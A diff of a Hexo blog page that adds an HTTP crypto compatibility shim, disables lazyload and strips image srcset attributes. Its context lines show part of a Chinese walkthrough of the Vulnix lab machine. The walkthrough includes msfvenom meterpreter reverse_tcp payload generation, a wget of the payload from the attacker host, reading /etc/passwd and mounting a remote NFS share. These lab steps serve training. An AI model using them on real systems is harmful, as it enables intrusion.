@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -263,11 +278,11 @@
 <p>            run</p>
 <p>靶机：.&#x2F;exploit</p>
 <p>我说怎么还是user权限，不是meterpreter.….原来生成的攻击载荷搞错了。ORZ</p>
-<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7357f98f994f3def.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
+<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7357f98f994f3def.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
 <p>::: {.image-caption}<br>:::<br>:::</p>
 <h4 id="重新尝试："><a href="#重新尝试：" class="headerlink" title="重新尝试："></a>重新尝试：</h4><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.1.107<br>LPORT&#x3D;1234 X &gt; &#x2F;var&#x2F;www&#x2F;door</p>
 <p>省略一些命令。。。</p>
-<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-52f29ec62460154c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
+<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-52f29ec62460154c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
 <p>::: {.image-caption}<br>:::<br>:::</p>
 <p>em..?未知的命令.….所以meterpreter该怎么用。</p>
 <blockquote>
@@ -299,7 +314,7 @@
 <p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp -f elf<br>LHOST&#x3D;192.168.1.107 LPORT&#x3D;1234 X &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;xxx</p>
 <p>wget <a target="_blank" rel="noopener" href="http://192.168.1.107/xxx">http://192.168.1.107/xxx</a></p>
 <p>成功获取到了meterpreter。</p>
-<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c0300f478e71f626.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
+<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c0300f478e71f626.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
 <p>::: {.image-caption}<br>:::<br>:::</p>
 <blockquote>
 <p>cat &#x2F;etc&#x2F;passwd</p>
@@ -332,10 +347,10 @@
 <p>root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root<br>时，那么这个使用者的权限将被压缩成为匿名使用者，通常他的 UID 与 GID<br>都会变成 nobody 那个系统账号的身份。</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dantes91/p/5007992.html">关于nfs共享目录的使用技巧</a>，如果没有用过nfs服务，学习下。</p>
-<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-8be58c6b635481e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
+<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-8be58c6b635481e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
 <p>::: {.image-caption}<br>显示远程服务器共享目录<br>:::<br>:::</p>
 <p><strong>将远程共享目录挂载到本地</strong>，&#x2F;tmp&#x2F;nfs<br>是本地的一个目录。如果没有该目录，可以用”mkdir &#x2F;tmp&#x2F;nfs”来新建。<br>mount -t nfs 192.168.1.113:&#x2F;home&#x2F;vulnix <strong>&#x2F;tmp&#x2F;nfs</strong></p>
-<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-178665a456328798.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
+<p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-178665a456328798.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width&#x3D;”auto” height&#x3D;”auto”}\</p>
 <p>::: {.image-caption}<br>:::<br>:::</p>
 <p>**writup: <a target="_blank" rel="noopener" href="http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm/">http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm\</a><br>**</p>
 <p><strong>靶机重启后，有root权限，就可以用gcc编译exp了。</strong></p>
@@ -487,10 +502,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
